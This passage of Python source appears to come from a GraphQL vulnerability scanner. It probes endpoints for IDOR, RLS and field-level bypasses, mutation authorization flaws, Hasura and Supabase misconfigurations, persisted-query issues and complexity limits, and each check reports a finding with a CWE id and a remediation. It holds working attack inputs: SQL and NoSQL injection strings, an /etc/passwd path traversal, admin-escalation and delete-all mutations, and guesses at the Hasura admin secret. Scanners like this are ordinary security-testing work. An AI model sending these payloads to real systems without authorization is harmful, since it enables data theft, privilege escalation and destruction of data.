        findings: list[Finding] = []

        idor_queries = [
            {"query": "query($id: ID!) { user(id: $id) { id email } }", "variables": {"id": "1"}},
            {"query": "query($id: Int!) { user(id: $id) { id email } }", "variables": {"id": 1}},
            {"query": "{ users { id email } }"},
            {"query": "query($id: ID!) { order(id: $id) { id total } }", "variables": {"id": "1"}},
            {"query": "query($id: ID!) { document(id: $id) { id content } }", "variables": {"id": "1"}},
        ]

        for payload in idor_queries:
            await rate_limiter.acquire()

            try:
                response = await client.post(
                    graphql_url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                )

                if response.status_code != 200:
                    continue

                data = response.json()

                # Only process valid GraphQL dict responses
                if not isinstance(data, dict):
                    continue

                graphql_data = data.get("data")
                if not graphql_data:
                    continue

                data_str = str(graphql_data).lower()

                # Sensitive fields heuristic
                sensitive_markers = ("email", "password", "token", "content", "total")

                if any(marker in data_str for marker in sensitive_markers):
                    findings.append(Finding(
                        name="GraphQL IDOR - Unauthorized Object Access",
                        severity=Severity.HIGH,
                        confidence_score=70.0,
                        description="GraphQL endpoint returns sensitive object data without authorization checks",
                        endpoint=graphql_url,
                        evidence=[
                            f"Query: {payload.get('query', '')[:80]}...",
                            "Sensitive fields returned for arbitrary identifier",
                        ],
                        cwe_id="CWE-639",
                        cvss_score=7.5,
                        remediation=(
                            "Enforce object-level authorization in GraphQL resolvers. "
                            "Validate ownership and permissions before returning data."
                        ),
                    ))
                    break  # Stop after first confirmed IDOR

            except Exception as e:
                logger.debug(f"Error testing GraphQL IDOR: {e}")

        return findings

    
    async def _test_variable_injection(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for injection vulnerabilities in GraphQL variables."""
        findings = []
        
        injection_payloads = [
            # SQL injection in variables
            {"query": "query($name: String!) { user(name: $name) { id } }", 
             "variables": {"name": "' OR '1'='1"}},
            # NoSQL injection
            {"query": "query($filter: JSON!) { users(filter: $filter) { id } }",
             "variables": {"filter": {"$ne": ""}}},
            # Path traversal
            {"query": "query($file: String!) { file(path: $file) { content } }",
             "variables": {"file": "../../../etc/passwd"}},
        ]
        
        for payload in injection_payloads:
            await rate_limiter.acquire()
            
            try:
                response = await client.post(
                    graphql_url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code == 200:
                    data = response.json()
                    response_text = str(data).lower()
                    
                    # Check for injection success indicators
                    if "root:" in response_text or "etc/passwd" in response_text:
                        findings.append(Finding(
                            name="GraphQL Path Traversal",
                            severity=Severity.CRITICAL,
                            confidence_score=85.0,
                            description="Path traversal via GraphQL variables",
                            endpoint=graphql_url,
                            evidence=["File contents in response"],
                            cwe_id="CWE-22",
                            cvss_score=9.1,
                            remediation="Validate and sanitize all variable input.",
                        ))
                    # FIX 2026-02-16: Removed undefined `asset_data` check
                    # Check for NoSQL injection attempt in payload variables
                    if isinstance(data, dict) and "$ne" in str(payload):
                        graphql_data = data.get("data")
                        if graphql_data:  # only proceed if 'data' exists and is non-empty
                            findings.append(Finding(
                                name="GraphQL NoSQL Injection",
                                severity=Severity.HIGH,
                                confidence_score=65.0,
                                description="NoSQL injection via GraphQL variables",
                                endpoint=graphql_url,
                                evidence=["NoSQL operator accepted in variables"],
                                cwe_id="CWE-943",
                                cvss_score=7.5,
                                remediation="Validate variable types strictly. Sanitize JSON input.",
                            ))

                        
            except Exception as e:
                logger.debug(f"Error testing injection: {e}")
        
        return findings

    # ========================================================================
    # ENTERPRISE METHODS - Schema Extraction
    # ========================================================================
    
    async def _extract_schema_info(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> SchemaInfo:
        """Extract schema information and detect backend type."""
        schema_info = SchemaInfo()
        
        # Full introspection query
        introspection_query = """
        query IntrospectionQuery {
            __schema {
                types {
                    name
                    kind
                    fields {
                        name
                        args {
                            name
                            type { name kind }
                        }
                    }
                }
                queryType { name }
                mutationType { name }
                subscriptionType { name }
            }
        }
        """
        
        await rate_limiter.acquire()
        
        try:
            response = await client.post(
                graphql_url,
                json={"query": introspection_query},
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                data = response.json()

                # FIX 2026-02-16: Removed undefined `asset_data` check - check `data` instead
                if isinstance(data, dict) and "data" in data and isinstance(data["data"], dict) and data["data"].get("__schema"):
                    schema = data["data"]["__schema"]

                    # Extract types
                    for t in schema.get("types", []):
                        type_name = t.get("name", "")
                        if not type_name.startswith("__"):
                            schema_info.types.append(type_name)

                            # Extract fields and check for sensitive ones
                            for field in t.get("fields", []) or []:
                                field_name = field.get("name", "").lower()
                                if any(s in field_name for s in self.SENSITIVE_FIELDS):
                                    schema_info.sensitive_fields.append(
                                        f"{type_name}.{field.get('name')}"
                                    )

                                # Extract filter arguments (Hasura/Supabase style)
                                for arg in field.get("args", []) or []:
                                    arg_name = arg.get("name", "")
                                    if arg_name in ["where", "filter", "_where"]:
                                        schema_info.filter_args.append(
                                            f"{type_name}.{field.get('name')}"
                                        )

                    # Detect backend type
                    schema_info.backend_type = self._detect_backend_type(schema_info.types)

                    # Extract query/mutation names
                    query_type = schema.get("queryType", {}).get("name")
                    mutation_type = schema.get("mutationType", {}).get("name")
                    subscription_type = schema.get("subscriptionType", {}).get("name")

                    for t in schema.get("types", []):
                        if t.get("name") == query_type:
                            schema_info.queries = [
                                f.get("name") for f in (t.get("fields") or [])
                            ]
                        elif t.get("name") == mutation_type:
                            schema_info.mutations = [
                                f.get("name") for f in (t.get("fields") or [])
                            ]
                        elif t.get("name") == subscription_type:
                            schema_info.subscriptions = [
                                f.get("name") for f in (t.get("fields") or [])
                            ]
                            
        except Exception as e:
            logger.debug(f"Error extracting schema: {e}")
        
        return schema_info
    
    def _detect_backend_type(self, types: list[str]) -> str | None:
        """Detect GraphQL backend type from schema types."""
        types_lower = [t.lower() for t in types]
        types_str = " ".join(types)
        
        # Hasura patterns
        hasura_patterns = [
            "mutation_root", "query_root", "subscription_root",
            "_aggregate", "_bool_exp", "_order_by", "_pk_columns_input"
        ]
        if any(p in types_str for p in hasura_patterns):
            return "hasura"
        
        # Supabase/PostgREST patterns
        supabase_patterns = [
            "PageInfo", "Connection", "Edge", "_filter", "_orderBy"
        ]
        if any(p in types_str for p in supabase_patterns):
            return "supabase"
        
        # PostGraphile patterns
        postgraphile_patterns = [
            "Cursor", "OrderBy", "Condition", "Input", "Patch"
        ]
        if sum(1 for p in postgraphile_patterns if p in types_str) >= 3:
            return "postgraphile"
        
        # Apollo patterns
        if "CacheControlScope" in types:
            return "apollo"
        
        return None

    # ========================================================================
    # ENTERPRISE METHODS - RLS Filter Bypass (FASE 3.5)
    # ========================================================================
    
    async def _test_rls_filter_bypass(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for RLS filter manipulation attacks."""
        findings = []
        
        logger.info("🔓 Testing RLS filter bypass attacks...")
        
        # Get tables/types to test
        test_types = []
        if self.schema_info:
            # Look for common data types
            for t in self.schema_info.types:
                t_lower = t.lower()
                if any(x in t_lower for x in ["user", "order", "profile", "account", "post", "message"]):
                    test_types.append(t)
        
        if not test_types:
            test_types = ["users", "User", "profiles", "Profile", "accounts"]
        
        for type_name in test_types[:5]:  # Limit to 5 types
            # Test each filter bypass payload
            for filter_payload in RLS_FILTER_BYPASS_PAYLOADS[:5]:  # Limit payloads
                query = f"""
                query {{
                    {type_name.lower()}(where: {json.dumps(filter_payload)}) {{
                        id
                    }}
                }}
                """
                
                # Also try Hasura-style with _where
                query_hasura = f"""
                query {{
                    {type_name.lower()}(
                        where: {json.dumps(filter_payload)}
                    ) {{
                        id
                    }}
                }}
                """
                
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        graphql_url,
                        json={"query": query},
                        headers={"Content-Type": "application/json"}
                    )
                    
                    if response.status_code == 200:
                        data = response.json()

                        # FIX 2026-02-16: Removed undefined `asset_data` check
                        if isinstance(data, dict) and "data" in data and isinstance(data["data"], dict) and data["data"]:
                            type_data = data["data"].get(type_name.lower())
                            if type_data and len(type_data) > 0:
                                findings.append(Finding(
                                    name="GraphQL RLS Filter Bypass",
                                    severity=Severity.HIGH,
                                    confidence_score=85.0,
                                    description=f"RLS filter bypass on {type_name} using filter manipulation",
                                    endpoint=graphql_url,
                                    evidence=[
                                        f"Type: {type_name}",
                                        f"Filter: {json.dumps(filter_payload)[:100]}",
                                        f"Records returned: {len(type_data)}",
                                    ],
                                    cwe_id="CWE-639",
                                    cvss_score=8.0,
                                    remediation="Review RLS policies. Ensure filters cannot be manipulated. "
                                               "Use server-side user context for authorization.",
                                ))
                                break  # Found vulnerability for this type
                                
                except Exception as e:
                    logger.debug(f"Filter bypass test error: {e}")
        
        return findings

    # ========================================================================
    # ENTERPRISE METHODS - Column Access Bypass
    # ========================================================================
    
    async def _test_column_access_bypass(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for column-level access control bypass."""
        findings = []
        
        logger.info("🔐 Testing column access control bypass...")
        
        if not self.schema_info or not self.schema_info.sensitive_fields:
            # Try common sensitive field names
            sensitive_tests = [
                ("users", ["password", "password_hash", "secret", "api_key", "token"]),
                ("profiles", ["ssn", "credit_card", "salary", "internal_notes"]),
                ("accounts", ["balance", "credit_limit", "verification_code"]),
            ]
        else:
            # Use discovered sensitive fields
            sensitive_tests = []
            for field_path in self.schema_info.sensitive_fields:
                type_name, field_name = field_path.split(".")
                found = False
                for t, fields in sensitive_tests:
                    if t == type_name.lower():
                        fields.append(field_name)
                        found = True
                        break
                if not found:
                    sensitive_tests.append((type_name.lower(), [field_name]))
        
        for type_name, sensitive_fields in sensitive_tests:
            for field in sensitive_fields:
                # Try to access sensitive field directly
                query = f"""
                query {{
                    {type_name} {{
                        id
                        {field}
                    }}
                }}
                """
                
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        graphql_url,
                        json={"query": query},
                        headers={"Content-Type": "application/json"}
                    )
                    
                    if response.status_code == 200:
                        data = response.json()

                        # FIX 2026-02-16: Removed undefined `asset_data` check
                        if isinstance(data, dict) and "data" in data and isinstance(data["data"], dict) and data["data"]:
                            type_data = data["data"].get(type_name)
                            if type_data:
                                items = type_data if isinstance(type_data, list) else [type_data]
                                for item in items:
                                    if item and field in item and item[field]:
                                        findings.append(Finding(
                                            name="GraphQL Column Access Control Bypass",
                                            severity=Severity.CRITICAL,
                                            confidence_score=85.0,
                                            description=f"Sensitive field '{field}' exposed on type '{type_name}'",
                                            endpoint=graphql_url,
                                            evidence=[
                                                f"Type: {type_name}",
                                                f"Field: {field}",
                                                f"Value leaked: {str(item[field])[:50]}...",
                                            ],
                                            cwe_id="CWE-200",
                                            cvss_score=9.0,
                                            remediation="Remove sensitive fields from schema or implement "
                                                       "field-level authorization.",
                                        ))
                                        break
                                        
                except Exception as e:
                    logger.debug(f"Column access test error: {e}")
        
        return findings

    # ========================================================================
    # ENTERPRISE METHODS - Aggregate Abuse
    # ========================================================================
    
    async def _test_aggregate_abuse(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for aggregate function abuse to leak data."""
        findings = []
        
        logger.info("📊 Testing aggregate function abuse...")
        
        # Common types to test
        test_types = ["users", "orders", "profiles", "accounts", "transactions"]
        if self.schema_info:
            test_types = [t.lower() for t in self.schema_info.types if not t.startswith("_")][:10]
        
        for type_name in test_types:
            for aggregate in AGGREGATE_PAYLOADS:
                # Hasura-style aggregate
                query_hasura = f"""
                query {{
                    {type_name}_aggregate {{
                        {aggregate}
                    }}
                }}
                """
                
                # Alternative style
                query_alt = f"""
                query {{
                    {type_name} {{
                        {aggregate}
                    }}
                }}
                """
                
                await rate_limiter.acquire()
                
                try:
                    for query in [query_hasura, query_alt]:
                        response = await client.post(
                            graphql_url,
                            json={"query": query},
                            headers={"Content-Type": "application/json"}
                        )
                        
                        if response.status_code == 200:
                            data = response.json()

                            # FIX 2026-02-16: Removed undefined `asset_data` check
                            if isinstance(data, dict) and "data" in data and data["data"]:
                                # Check for aggregate results
                                agg_key = f"{type_name}_aggregate"
                                agg_data = data["data"].get(agg_key) or data["data"].get(type_name)

                                if agg_data and "aggregate" in str(agg_data):
                                    findings.append(Finding(
                                        name="GraphQL Aggregate Data Leakage",
                                        severity=Severity.MEDIUM,
                                        confidence_score=85.0,
                                        description=f"Aggregate functions expose data counts/statistics for '{type_name}'",
                                        endpoint=graphql_url,
                                        evidence=[
                                            f"Type: {type_name}",
                                            f"Aggregate: {aggregate}",
                                            f"Data: {str(agg_data)[:200]}",
                                        ],
                                        cwe_id="CWE-200",
                                        cvss_score=5.0,
                                        remediation="Restrict aggregate queries with authorization. "
                                                   "Consider removing aggregates from public schema.",
                                    ))
                                    break
                                    
                except Exception as e:
                    logger.debug(f"Aggregate test error: {e}")
        
        return findings

    # ========================================================================
    # ENTERPRISE METHODS - Relationship Traversal
    # ========================================================================
    
    async def _test_relationship_traversal(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for RLS bypass through relationship traversal."""
        findings = []
        
        logger.info("🔗 Testing relationship traversal attacks...")
        
        # Build relationship queries based on schema
        relationship_queries = []
        
        if self.schema_info and self.schema_info.queries:
            # Find queries that might have relationships
            for query_name in self.schema_info.queries:
                # Try common relationship patterns
                queries = [
                    f"{{ {query_name} {{ id user {{ email }} }} }}",
                    f"{{ {query_name} {{ id author {{ password }} }} }}",
                    f"{{ {query_name} {{ id owner {{ api_key }} }} }}",
                    f"{{ {query_name} {{ id created_by {{ secret }} }} }}",
                ]
                relationship_queries.extend(queries)
        else:
            # Default relationship tests
            relationship_queries = [
                "{ orders { id user { email password } } }",
                "{ posts { id author { email api_key } } }",
                "{ messages { id sender { phone ssn } } }",
                "{ transactions { id account { balance } } }",
                "{ comments { id user { password_hash } } }",
            ]
        
        for query in relationship_queries[:10]:  # Limit tests
            await rate_limiter.acquire()
            
            try:
                response = await client.post(
                    graphql_url,
                    json={"query": query},
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code == 200:
                    data = response.json()
                    data_str = json.dumps(data).lower()

                    # Check for sensitive data in nested relationships
                    sensitive_indicators = ["password", "secret", "api_key", "token", "ssn", "credit"]

                    # FIX 2026-02-16: Removed undefined `asset_data` check
                    if isinstance(data, dict) and "data" in data and data["data"]:
                        for indicator in sensitive_indicators:
                            if indicator in data_str and f'"{indicator}"' not in data_str.replace(" ", ""):
                                # Found sensitive data in response (not just field name)
                                findings.append(Finding(
                                    name="GraphQL Relationship Traversal RLS Bypass",
                                    severity=Severity.CRITICAL,
                                    confidence_score=85.0,
                                    description="Sensitive data accessed through relationship traversal",
                                    endpoint=graphql_url,
                                    evidence=[
                                        f"Query: {query[:100]}",
                                        f"Sensitive indicator: {indicator}",
                                    ],
                                    cwe_id="CWE-639",
                                    cvss_score=9.0,
                                    remediation="Implement authorization on all relationship fields. "
                                            "Use field-level RLS policies.",
                                ))
                                break
                                
            except Exception as e:
                logger.debug(f"Relationship traversal test error: {e}")
        
        return findings

    # ========================================================================
    # ENTERPRISE METHODS - Mutation Bypass
    # ========================================================================
    
    async def _test_mutation_bypass(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for mutation authorization bypass."""
        findings = []
        
        logger.info("✏️ Testing mutation authorization bypass...")
        
        # Build mutation tests from schema
        mutation_tests = []
        
        if self.schema_info and self.schema_info.mutations:
            for mutation in self.schema_info.mutations:
                mutation_lower = mutation.lower()
                
                # Test insert mutations
                if "insert" in mutation_lower:
                    mutation_tests.append(
                        f"mutation {{ {mutation}(objects: [{{}}]) {{ affected_rows }} }}"
                    )
                
                # Test update mutations
                elif "update" in mutation_lower:
                    mutation_tests.append(
                        f"mutation {{ {mutation}(where: {{}}, _set: {{}}) {{ affected_rows }} }}"
                    )
                
                # Test delete mutations
                elif "delete" in mutation_lower:
                    mutation_tests.append(
                        f"mutation {{ {mutation}(where: {{}}) {{ affected_rows }} }}"
                    )
        else:
            # Default mutation tests
            mutation_tests = [
                "mutation { insert_users(objects: [{role: \"admin\"}]) { affected_rows } }",
                "mutation { update_users(where: {}, _set: {is_admin: true}) { affected_rows } }",
                "mutation { delete_users(where: {}) { affected_rows } }",
                "mutation { createUser(input: {role: \"admin\"}) { id } }",
                "mutation { updateUser(id: 1, input: {role: \"admin\"}) { id } }",
            ]
        
        for mutation in mutation_tests[:10]:  # Limit tests
            await rate_limiter.acquire()
            
            try:
                response = await client.post(
                    graphql_url,
                    json={"query": mutation},
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code == 200:
                    data = response.json()

                    # FIX 2026-02-16: Removed undefined `asset_data` check
                    if isinstance(data, dict) and "data" in data and data["data"]:
                        # Check for success indicators
                        data_str = str(data["data"])

                        if "affected_rows" in data_str or "id" in data_str:
                            # Mutation might have succeeded
                            if "0" not in data_str:  # Check it wasn't zero affected
                                findings.append(Finding(
                                    name="GraphQL Mutation Authorization Bypass",
                                    severity=Severity.CRITICAL,
                                    confidence_score=65.0,
                                    description="Mutation executed without proper authorization",
                                    endpoint=graphql_url,
                                    evidence=[
                                        f"Mutation: {mutation[:100]}",
                                        f"Response: {data_str[:200]}",
                                    ],
                                    cwe_id="CWE-284",
                                    cvss_score=9.5,
                                    remediation="Implement mutation-level authorization. "
                                               "Verify user permissions before mutations.",
                                ))
                                
            except Exception as e:
                logger.debug(f"Mutation bypass test error: {e}")
        
        return findings

    # ========================================================================
    # ENTERPRISE METHODS - Hasura-Specific Attacks
    # ========================================================================
    
    async def _test_hasura_specific(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test Hasura-specific vulnerabilities."""
        findings = []
        
        logger.info("🔷 Testing Hasura-specific vulnerabilities...")
        
        # Test admin secret
        for headers in HASURA_PAYLOADS:
            await rate_limiter.acquire()
            
            try:
                test_query = """
                query {
                    __schema {
                        types { name }
                    }
                }
                """
                
                response = await client.post(
                    graphql_url,
                    json={"query": test_query},
                    headers={**{"Content-Type": "application/json"}, **headers}
                )
                
                if response.status_code == 200:
                    data = response.json()

                    # FIX 2026-02-16: Removed undefined `asset_data` check
                    if isinstance(data, dict) and "data" in data and data["data"].get("__schema"):
                        types_count = len(data["data"]["__schema"].get("types", []))

                        # More types with admin = potential escalation
                        if types_count > 50:  # Arbitrary threshold
                            if "x-hasura-admin-secret" in headers:
                                findings.append(Finding(
                                    name="Hasura Admin Secret Found",
                                    severity=Severity.CRITICAL,
                                    confidence_score=85.0,
                                    description=f"Hasura admin secret discovered: {headers.get('x-hasura-admin-secret')}",
                                    endpoint=graphql_url,
                                    evidence=[
                                        f"Secret: {headers.get('x-hasura-admin-secret')}",
                                        f"Types exposed: {types_count}",
                                    ],
                                    cwe_id="CWE-798",
                                    cvss_score=10.0,
                                    remediation="Change admin secret immediately. "
                                               "Use environment variables for secrets.",
                                ))
                            elif "x-hasura-role" in headers:
                                findings.append(Finding(
                                    name="Hasura Role Escalation",
                                    severity=Severity.HIGH,
                                    confidence_score=65.0,
                                    description="Role escalation via x-hasura-role header",
                                    endpoint=graphql_url,
                                    evidence=[
                                        f"Role: {headers.get('x-hasura-role')}",
                                        f"Access granted to {types_count} types",
                                    ],
                                    cwe_id="CWE-269",
                                    cvss_score=8.0,
                                    remediation="Validate role headers server-side. "
                                               "Don't trust client-provided roles.",
                                ))
                                
            except Exception as e:
                logger.debug(f"Hasura test error: {e}")
        
        return findings

    # ========================================================================
    # ENTERPRISE METHODS - Supabase-Specific Attacks
    # ========================================================================
    
    async def _test_supabase_specific(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test Supabase-specific vulnerabilities."""
        findings = []
        
        logger.info("🟢 Testing Supabase-specific vulnerabilities...")
        
        # Test service role key exposure
        service_role_patterns = [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",  # JWT header
            "service_role",
            "supabase_service_key",
        ]
        
        # Test PostgREST RLS bypass
        postgrest_endpoints = [
            "/rest/v1/users?select=*",
            "/rest/v1/profiles?select=*",
            "/rest/v1/accounts?select=*",
        ]
        
        base_url = graphql_url.rsplit("/", 1)[0]
        
        for endpoint in postgrest_endpoints:
            await rate_limiter.acquire()
            
            try:
                url = f"{base_url}{endpoint}"
                
                # Try without auth
                response = await client.get(
                    url,
                    headers={"Accept": "application/json"}
                )
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, list) and len(data) > 0:
                            findings.append(Finding(
                                name="Supabase PostgREST RLS Bypass",
                                severity=Severity.HIGH,
                                confidence_score=85.0,
                                description=f"PostgREST endpoint exposed without RLS: {endpoint}",
                                endpoint=url,
                                evidence=[
                                    f"Endpoint: {endpoint}",
                                    f"Records returned: {len(data)}",
                                ],
                                cwe_id="CWE-639",
                                cvss_score=8.0,
                                remediation="Enable RLS on all tables. "
                                           "Review PostgREST configuration.",
                            ))
                    except json.JSONDecodeError:
                        pass
                        
            except Exception as e:
                logger.debug(f"Supabase test error: {e}")
        
        return findings

    # ========================================================================
    # ENTERPRISE METHODS - Subscription Leakage
    # ========================================================================
    
    async def _test_subscription_leakage(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for subscription data leakage."""
        findings = []
        
        logger.info("📡 Testing subscription security...")
        
        # Check if subscriptions are available
        subscription_query = """
        query {
            __schema {
                subscriptionType {
                    name
                    fields {
                        name
                        args { name }
                    }
                }
            }
        }
        """
        
        await rate_limiter.acquire()
        
        try:
            response = await client.post(
                graphql_url,
                json={"query": subscription_query},
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                data = response.json()

                # FIX 2026-02-16: Removed undefined `asset_data` check
                if isinstance(data, dict) and "data" in data and data["data"].get("__schema"):
                    sub_type = data["data"]["__schema"].get("subscriptionType")

                    if sub_type and sub_type.get("fields"):
                        fields = sub_type["fields"]
                        sensitive_subs = []

                        for field in fields:
                            field_name = field.get("name", "").lower()
                            if any(s in field_name for s in ["user", "order", "message", "notification"]):
                                sensitive_subs.append(field.get("name"))

                        if sensitive_subs:
                            findings.append(Finding(
                                name="GraphQL Subscription Data Exposure Risk",
                                severity=Severity.MEDIUM,
                                confidence_score=65.0,
                                description="Subscriptions available that may leak sensitive data",
                                endpoint=graphql_url,
                                evidence=[
                                    f"Subscriptions found: {len(fields)}",
                                    f"Potentially sensitive: {', '.join(sensitive_subs[:5])}",
                                ],
                                cwe_id="CWE-200",
                                cvss_score=5.0,
                                remediation="Implement subscription-level authorization. "
                                           "Filter subscription data based on user context.",
                            ))
                            
        except Exception as e:
            logger.debug(f"Subscription test error: {e}")

        return findings

    # ========================================================================
    # MODERN GRAPHQL ATTACKS (2026-02-18)
    # Extended coverage for APQ, complexity bypass, field duplication,
    # extensions exposure, federation attacks, and fragment bombing
    # ========================================================================

    async def _test_persisted_queries(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test for Automatic Persisted Queries (APQ) vulnerabilities.

        APQ allows attackers to:
        1. Enumerate cached query hashes
        2. Execute queries via hash without knowing the query
        3. Hash collision attacks (rare but dangerous)
        """
        findings = []

        logger.info("🔑 Testing Persisted Queries (APQ) vulnerabilities...")

        # Test 1: Check if APQ is enabled
        # Apollo Server APQ format
        apq_probe = {
            "extensions": {
                "persistedQuery": {
                    "version": 1,
                    "sha256Hash": "ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38"
                }
            }
        }

        await rate_limiter.acquire()

        try:
            response = await client.post(
                graphql_url,
                json=apq_probe,
                headers={"Content-Type": "application/json"}
            )

            if response.status_code == 200:
                data = response.json()

                if isinstance(data, dict):
                    errors = data.get("errors", [])
                    error_text = str(errors).lower()

                    # APQ is enabled if server recognizes persisted query format
                    if "persistedquery" in error_text or "persisted" in error_text:
                        # Check if hash was not found (expected) vs error
                        if "notfound" in error_text or "not found" in error_text:
                            findings.append(Finding(
                                name="GraphQL APQ Enabled",
                                severity=Severity.LOW,
                                confidence_score=85.0,
                                description="Automatic Persisted Queries (APQ) is enabled. "
                                           "While useful for performance, can enable query enumeration.",
                                endpoint=graphql_url,
                                evidence=[
                                    "APQ extension accepted by server",
                                    "Hash not found error returned",
                                ],
                                cwe_id="CWE-200",
                                cvss_score=3.1,
                                remediation="Consider disabling APQ in production or implementing "
                                           "allow-list for registered hashes only.",
                            ))
                        elif "data" in data and data["data"]:
                            # Hash matched! This is a known query
                            findings.append(Finding(
                                name="GraphQL APQ Hash Collision/Enumeration",
                                severity=Severity.MEDIUM,
                                confidence_score=75.0,
                                description="APQ returned data for test hash - may indicate "
                                           "hash collision or enumerable queries.",
                                endpoint=graphql_url,
                                evidence=[
                                    "Test hash returned valid data",
                                    f"Response: {str(data)[:200]}",
                                ],
                                cwe_id="CWE-200",
                                cvss_score=5.3,
                                remediation="Audit persisted query registry. Use strong hashing.",
                            ))

        except Exception as e:
            logger.debug(f"APQ test error: {e}")

        # Test 2: APQ registration without validation
        apq_register = {
            "query": "{ __typename }",
            "extensions": {
                "persistedQuery": {
                    "version": 1,
                    "sha256Hash": "a".ljust(64, "0")  # Invalid hash
                }
            }
        }

        await rate_limiter.acquire()

        try:
            response = await client.post(
                graphql_url,
                json=apq_register,
                headers={"Content-Type": "application/json"}
            )

            if response.status_code == 200:
                data = response.json()

                if isinstance(data, dict) and "data" in data and data["data"]:
                    # Server accepted query with mismatched hash
                    findings.append(Finding(
                        name="GraphQL APQ Hash Bypass",
                        severity=Severity.HIGH,
                        confidence_score=85.0,
                        description="Server accepts persisted queries with mismatched hashes. "
                                   "Attackers can register arbitrary queries.",
                        endpoint=graphql_url,
                        evidence=[
                            "Mismatched hash accepted",
                            "Query executed despite invalid hash",
                        ],
                        cwe_id="CWE-345",
                        cvss_score=7.5,
                        remediation="Enable strict hash validation. Reject queries with "
                                   "mismatched SHA256 hashes.",
                    ))

        except Exception as e:
            logger.debug(f"APQ registration test error: {e}")

        return findings

    async def _test_query_complexity_bypass(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test for query complexity/cost analysis bypass.

        Techniques:
        1. Fragment spreading to hide complexity
        2. Alias-based complexity multiplication
        3. @skip/@include directive abuse
        """
        findings = []

        logger.info("📈 Testing query complexity bypass...")

        # Test 1: Fragment spreading to exceed complexity
        fragment_query = """
        query ComplexityBypass {
            ...F1
        }
        fragment F1 on Query { __typename ...F2 }
        fragment F2 on Query { __typename ...F3 }
        fragment F3 on Query { __typename ...F4 }
        fragment F4 on Query { __typename ...F5 }
        fragment F5 on Query { __typename ...F6 }
        fragment F6 on Query { __typename ...F7 }
        fragment F7 on Query { __typename ...F8 }
        fragment F8 on Query { __typename ...F9 }
        fragment F9 on Query { __typename ...F10 }
        fragment F10 on Query {
            a1: __typename a2: __typename a3: __typename a4: __typename a5: __typename
            a6: __typename a7: __typename a8: __typename a9: __typename a10: __typename
        }
        """

        await rate_limiter.acquire()

        try:
            start_time = time.time()
            response = await client.post(
                graphql_url,
                json={"query": fragment_query},
                headers={"Content-Type": "application/json"},
                timeout=15.0
            )
            elapsed = time.time() - start_time

            if response.status_code == 200:
                data = response.json()

                if isinstance(data, dict):
                    errors = data.get("errors", [])
                    # Check if complexity was rejected
                    has_complexity_error = any(
                        "complexity" in str(e).lower() or "cost" in str(e).lower()
                        for e in errors
                    )

                    if not has_complexity_error and "data" in data:
                        findings.append(Finding(
                            name="GraphQL Complexity Bypass via Fragments",
                            severity=Severity.MEDIUM,
                            confidence_score=70.0,
                            description="Fragment spreading bypasses complexity limits. "
                                       "Nested fragments can amplify query cost exponentially.",
                            endpoint=graphql_url,
                            evidence=[
                                "10-level fragment chain accepted",
                                f"Response time: {elapsed:.2f}s",
                            ],
                            cwe_id="CWE-400",
                            cvss_score=5.3,
                            remediation="Implement fragment depth limits. Use per-operation "
                                       "complexity scoring that accounts for fragments.",
                        ))

        except httpx.TimeoutException:
            findings.append(Finding(
                name="GraphQL Complexity DoS via Fragments",
                severity=Severity.HIGH,
                confidence_score=85.0,
                description="Fragment spreading caused server timeout - DoS possible.",
                endpoint=graphql_url,
                evidence=["10-level fragment chain caused timeout"],
                cwe_id="CWE-400",
                cvss_score=7.5,
                remediation="Implement fragment depth limits.",
            ))
        except Exception as e:
            logger.debug(f"Complexity bypass test error: {e}")

        # Test 2: @defer directive abuse (if supported)
        defer_query = """
        query DeferAbuse {
            __typename @defer
            a1: __typename @defer
            a2: __typename @defer
            a3: __typename @defer
        }
        """

        await rate_limiter.acquire()

        try:
            response = await client.post(
                graphql_url,
                json={"query": defer_query},
                headers={"Content-Type": "application/json", "Accept": "multipart/mixed"}
            )

            if response.status_code == 200:
                # Check for multipart/mixed response (defer support)
                content_type = response.headers.get("content-type", "")
                if "multipart" in content_type:
                    findings.append(Finding(
                        name="GraphQL @defer Directive Enabled",
                        severity=Severity.LOW,
                        confidence_score=85.0,
                        description="@defer directive is enabled, can be abused for "
                                   "resource exhaustion via concurrent deferred fragments.",
                        endpoint=graphql_url,
                        evidence=[
                            "Multipart response returned",
                            "@defer directive accepted",
                        ],
                        cwe_id="CWE-400",
                        cvss_score=3.7,
                        remediation="Limit concurrent deferred fragments. Monitor resource usage.",
                    ))

        except Exception as e:
            logger.debug(f"@defer test error: {e}")

        return findings

